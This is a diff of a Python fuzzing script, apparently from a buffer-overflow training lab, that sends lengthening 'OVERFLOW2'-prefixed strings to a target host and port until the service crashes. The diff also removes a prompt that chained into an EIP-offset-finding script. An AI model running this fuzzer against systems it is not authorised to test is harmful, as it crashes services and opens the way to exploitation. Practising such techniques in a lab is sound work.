@@ -10,7 +10,7 @@ from typing import Optional
 
 def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 	# Define prefix and buffer
-	prefix = b"OVERFLOW1 "														# CHANGE IF NECESSARY
+	prefix = b"OVERFLOW2 "														# CHANGE IF NECESSARY
 	buffer = b"A"
 	timeout = 5
 	payload = b""
@@ -24,8 +24,11 @@ def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 			s.settimeout(timeout)
 
 			# Print server banner
-			response = s.recv(4096)
-			print(f"Banner: {response.decode()}")
+			try:
+				response = s.recv(4096)
+				print(f"{response.decode()}")
+			except:
+				pass
 
 			# Send data to the server with increasing buffer sizes
 			step = increment or 100
@@ -43,26 +46,13 @@ def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 				# Print the response from the server
 				print(f"Response: {response.decode()}")
 
-		
-	except Exception as e:
-		print(e)
+	except ConnectionError:
+		print('Connection Refused')
+		sys.exit(0)
+	except:
 		print("\n","="*25,"CRASH","="*25,"\n")
 		overflow_threshold = len(payload) - len(prefix)
 		print(f"Application crashed at {overflow_threshold} bytes!")
-		while True:
-			answer = input("Do you want to continue and find the EIP offset? (y/n): ")
-			if answer.lower() == "y":
-				print("Starting to find EIP script with:")
-				print(f"\tIP: {ip}")
-				print(f"\tPort: {port}")
-				print(f"\tOverflow Threshold: {overflow_threshold}")
-				subprocess.run(['python', './002_control_eip.py', ip, port, overflow_threshold])
-				break
-			elif answer.lower() == "n":
-				print("Exiting...")
-				break
-			else:
-				print("Invalid input, please enter 'y' or 'n'.")
 		sys.exit(0)
 
 if __name__ == "__main__":
